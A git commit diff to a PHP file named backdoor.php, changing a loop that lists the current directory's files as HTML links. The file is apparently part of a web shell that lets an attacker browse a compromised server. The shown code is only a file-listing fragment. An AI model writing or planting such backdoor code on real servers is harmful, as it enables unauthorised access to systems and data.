1291f26f8b34b0c0723081191614a4bc82121883
Cvar1984 <32727560+Cvar1984@users.noreply.github.com>
2018-06-04 16:49:03 +0000

    Update backdoor.php

--- backdoor.php
+++ backdoor.php
@@ -2,14 +2,14 @@
 $dir=dirname("__DIR__");
 $dir=scandir($dir);
 $count=count($dir);
-for($x=2;$x<$count;$x++) {
+foreach($dir as $dir):
 echo "
 <center>
  <table border='1px' width='27%'>
   <tr>
-    <td><a href='$dir[$x]'>$dir[$x]</a></td>
+    <td><a href='$dir'>$dir</a></td>
   </tr>
  </table>
 </center>
 ";
-}
+endforeach;
